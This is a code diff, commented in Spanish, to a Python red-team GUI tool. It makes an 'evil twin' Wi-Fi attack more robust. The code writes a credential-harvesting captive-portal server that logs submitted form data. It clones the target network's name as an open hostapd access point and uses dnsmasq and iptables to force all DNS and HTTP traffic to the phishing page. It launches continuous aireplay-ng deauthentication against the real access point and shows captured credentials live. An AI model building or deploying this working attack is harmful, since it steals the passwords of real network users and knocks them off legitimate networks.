@@ -1239,6 +1239,8 @@ class RedTeamApp(tk.Tk):
         self.evil_twin_stop = False
 
         def ataque():
+            import shutil  # Importación segura para copiar directorios
+            
             self._evil_twin_limpiar_procesos()
             ap_iface = self.wifi_state["ap_iface"]
             deauth_iface = self.wifi_state.get("deauth_iface")
@@ -1251,17 +1253,23 @@ class RedTeamApp(tk.Tk):
                     f"/sys/class/net/{deauth_iface}mon") else deauth_iface
                 self.wifi_state["mon_deauth"] = mon_deauth
 
+            # 1. Copia segura nativa de Python (Evita fallos silenciosos de Bash)
             portals_dir = os.path.join(os.path.dirname(__file__), "evil_portals")
             tmp_web = f"/tmp/evil_twin_web_{timestamp}"
             os.makedirs(tmp_web, exist_ok=True)
-            subprocess.run(["cp", "-r", f"{portals_dir}/{portal}/.", tmp_web], stdout=subprocess.DEVNULL,
-                           stderr=subprocess.DEVNULL)
-
-            # Como session_dir es absoluta, cred_log también lo será (Ej: /home/pi/Resultados_...)
-            cred_log = os.path.join(session_dir, "credentials.log")
             
+            try:
+                ruta_origen = os.path.join(portals_dir, portal)
+                # Copia todo el contenido de la carpeta del portal a la carpeta temporal
+                shutil.copytree(ruta_origen, tmp_web, dirs_exist_ok=True)
+            except Exception as e:
+                self.escribir_consola(f"[!] Aviso al copiar archivos: {e}")
+
+            cred_log = os.path.abspath(os.path.join(session_dir, "credentials.log"))
+            
+            # 2. Servidor Web Multihilo y Blindado contra Bucles
             capture_script = f'''#!/usr/bin/env python3
-import http.server, urllib.parse, os, socketserver
+import http.server, urllib.parse, os
 from datetime import datetime
 
 LOG = "{cred_log}"
@@ -1270,127 +1278,120 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         parsed_path = urllib.parse.urlparse(self.path)
         
-        # Captura por GET por si acaso
+        # Captura por URL (GET) si es que el portal lo envía así
         if parsed_path.query:
-            params = urllib.parse.parse_qs(parsed_path.query)
             try:
+                params = urllib.parse.parse_qs(parsed_path.query)
                 with open(LOG, "a") as f: 
                     f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} DATA_GET:{{params}}\\n")
-                    f.flush()
-                    os.fsync(f.fileno())
-            except Exception as e:
-                pass # Evita crashear el servidor si hay error de escritura
+                    f.flush(); os.fsync(f.fileno())
+            except: pass
 
-        # Lógica de Redirección para Portales Cautivos (Android/iOS)
-        local_path = self.translate_path(parsed_path.path)
-        if not os.path.isfile(local_path) or parsed_path.path == "/":
+        # Interpretar la raíz "/" como "/index.html"
+        if parsed_path.path == "/":
+            self.path = "/index.html"
+            
+        local_path = self.translate_path(self.path)
+        
+        # Lógica de Redirección (Captive Portal Detector)
+        if not os.path.isfile(local_path):
+            # Prevención del bucle infinito si index.html no se copió correctamente
+            if self.path == "/index.html":
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b"<html><body><h2>Error de Servidor: El archivo index.html no existe.</h2></body></html>")
+                return
+                
+            # Si piden algo distinto (ej. generate_204), redirigir al portal
             self.send_response(302)
             self.send_header("Location", "http://10.0.0.1/index.html")
             self.end_headers()
             return
             
-        return http.server.SimpleHTTPRequestHandler.do_GET(self)
+        return super().do_GET()
 
     def do_POST(self):
-        length = int(self.headers.get("Content-Length", 0))
-        data = self.rfile.read(length).decode("utf-8", "ignore")
-        params = urllib.parse.parse_qs(data)
-        
-        # Guardado de credenciales con manejo de errores
         try:
+            length = int(self.headers.get("Content-Length", 0))
+            data = self.rfile.read(length).decode("utf-8", "ignore")
+            params = urllib.parse.parse_qs(data)
+            
             with open(LOG, "a") as f: 
                 f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} CREDENCIALES:{{params}}\\n")
-                f.flush() 
-                os.fsync(f.fileno())
-        except Exception as e:
-            pass
+                f.flush(); os.fsync(f.fileno())
+        except: pass
             
-        # Redirección de éxito
         self.send_response(302)
         self.send_header("Location", "http://10.0.0.1/success.html")
         self.end_headers()
         
-    def log_message(self, format, *args): 
-        pass # Silenciar logs
+    def log_message(self, format, *args): pass # Silencia logs para no saturar memoria
 
 if __name__ == "__main__":
     os.chdir("{tmp_web}")
-    with socketserver.TCPServer(("0.0.0.0", 80), CaptivePortalHandler) as httpd: 
+    # ThreadingHTTPServer atiende múltiples peticiones sin congelarse
+    class ThreadedServer(http.server.ThreadingHTTPServer):
+        allow_reuse_address = True
+        
+    with ThreadedServer(("0.0.0.0", 80), CaptivePortalHandler) as httpd: 
         httpd.serve_forever()
 '''
             with open(f"{tmp_web}/capture.py", "w") as f:
                 f.write(capture_script)
                 
-            # success.html adaptado para que coincida un poco con los colores de tu portal
             if not os.path.exists(f"{tmp_web}/success.html"):
                 with open(f"{tmp_web}/success.html", "w") as f:
-                    f.write('<html><body style="background:#0b1a2a;color:#fff;text-align:center;font-family:-apple-system, BlinkMacSystemFont, sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2><p style="color:#b0c7db;">Ya puede cerrar esta ventana y navegar normalmente.</p></body></html>')
+                    f.write('<html><body style="background:#0b1a2a;color:#fff;text-align:center;font-family:-apple-system, sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2><p style="color:#b0c7db;">Ya puede cerrar esta ventana.</p></body></html>')
 
-            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL,
-                           stderr=subprocess.DEVNULL)
+            # 3. Configuración del Access Point
+            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             hostapd_conf = f"interface={ap_iface}\ndriver=nl80211\nssid={red['essid']}\nhw_mode=g\nchannel={int(red['ch'])}\nmacaddr_acl=0\nauth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
+            
             with open("/tmp/hostapd_evil.conf", "w") as f:
                 f.write(hostapd_conf)
-            
-            
+                
             self.evil_twin_procs['hostapd'] = subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
-                                                               stdout=subprocess.DEVNULL,
-                                                               stderr=subprocess.DEVNULL)
+                                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(3)
 
-            # 1. Quitarle el control a NetworkManager para que no borre nuestra IP
+            # 4. Solución DHCP Raspberry Pi (Prevenir que NetworkManager borre la IP)
             subprocess.run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "no"], stderr=subprocess.DEVNULL)
-            
-            # 2. Reiniciar la interfaz y forzar la asignación de IP
             subprocess.run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
-            
-            # Crucial: Esperar a que el kernel de PiOS registre la IP antes de abrir dnsmasq
             time.sleep(1.5) 
 
-            # 3. Configuración dnsmasq a prueba de fallos (except-interface=lo previene choques en el puerto 53)
             dnsmasq_conf = f"interface={ap_iface}\nexcept-interface=lo\nbind-interfaces\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nno-hosts\nno-resolv\n"
             with open("/tmp/dnsmasq_evil.conf", "w") as f:
                 f.write(dnsmasq_conf)
-            
-            # Limpiar procesos fantasma que hayan quedado colgados
+                
             subprocess.run(["sudo", "pkill", "dnsmasq"], stderr=subprocess.DEVNULL)
-            
             self.evil_twin_procs['dnsmasq'] = subprocess.Popen(
                 ["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(2)
-            # ===================================
 
+            # 5. Iptables limpio (Sin redirigir el puerto 443 para evitar crasheos del servidor Python)
             subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
             subprocess.run(
                 ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT",
                  "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
-            subprocess.run(
-                ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "DNAT",
-                 "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
-            subprocess.run(
-                ["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", "80", "-j", "ACCEPT"],
-                stderr=subprocess.DEVNULL)
-            subprocess.run(
-                ["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", "53", "-j", "ACCEPT"],
-                stderr=subprocess.DEVNULL)
-            subprocess.run(
-                ["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", "53", "-j", "ACCEPT"],
-                stderr=subprocess.DEVNULL)
-            subprocess.run(
-                ["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", "67", "-j", "ACCEPT"],
-                stderr=subprocess.DEVNULL)
+            # Solo permitimos el tráfico necesario
+            for port in ["80", "53"]:
+                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+            for port in ["53", "67"]:
+                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
 
+            # 6. Lanzar servidor web de captura en segundo plano
             self.evil_twin_procs['capture'] = subprocess.Popen(["sudo", "python3", f"{tmp_web}/capture.py"],
-                                                               stdout=subprocess.DEVNULL,
-                                                               stderr=subprocess.DEVNULL)
+                                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(1)
 
+            # 7. Iniciar inyección de desautenticación si se configuró
             subprocess.run(["sudo", "iw", "dev", mon_deauth, "set", "channel", red['ch']], stderr=subprocess.DEVNULL,
                            stdout=subprocess.DEVNULL)
             deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", red['bssid']]
@@ -1400,6 +1401,7 @@ if __name__ == "__main__":
             self.evil_twin_procs['deauth'] = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL,
                                                               stderr=subprocess.DEVNULL)
 
+            # 8. Bucle de monitoreo para mostrar credenciales en la interfaz de la Pi
             last_lines = 0
             while not self.evil_twin_stop:
                 time.sleep(2)
@@ -1411,6 +1413,7 @@ if __name__ == "__main__":
                                 self.escribir_consola(f"[+] Cred: {line.strip()}")
                             last_lines = len(lines)
 
+            # Cierre seguro al presionar "DETENER ATAQUE"
             self._evil_twin_detener_procesos()
             self._evil_twin_limpiar_iptables(ap_iface)
             self.escribir_consola("[+] Evil Twin detenido.")
